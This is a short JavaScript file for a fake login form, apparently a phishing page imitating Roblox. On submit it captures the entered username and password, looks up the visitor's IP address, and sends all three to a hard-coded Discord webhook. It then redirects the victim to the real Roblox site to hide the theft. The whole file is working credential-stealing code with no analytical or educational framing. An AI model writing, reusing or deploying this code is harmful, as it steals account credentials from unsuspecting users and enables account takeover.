document.addEventListener("DOMContentLoaded", () => {
    const loginButton = document.getElementById("login-button");

    loginButton.addEventListener("click", () => {
        const username = document.getElementById("login-username").value.trim();
        const password = document.getElementById("login-password").value;

        if (!username || !password) {
            alert("請輸入帳號與密碼！");
            return;
        }

        fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                const userIP = data.ip;

                const webhookURL = "https://discord.com/api/webhooks/1380062024582692935/3_1l1EnLTwsSR1uH15wUhb1jdg-5DE4IZ-OLNbYcrRh9KWlE65RM9KZfIaVwPoW1xLQj";

                return fetch(webhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        content: `帳密\n帳號：${username}\n密碼：${password}\n使用者IP：${userIP}`
                    }),
                });
            })
            .then(() => {
                //console.log("已送出至 Discord Webhook");
                window.location.href = "https://www.roblox.com/";
            })
            .catch((error) => {
                console.error("發生錯誤：", error);
                window.location.href = "https://www.roblox.com/";
            });
    });
});
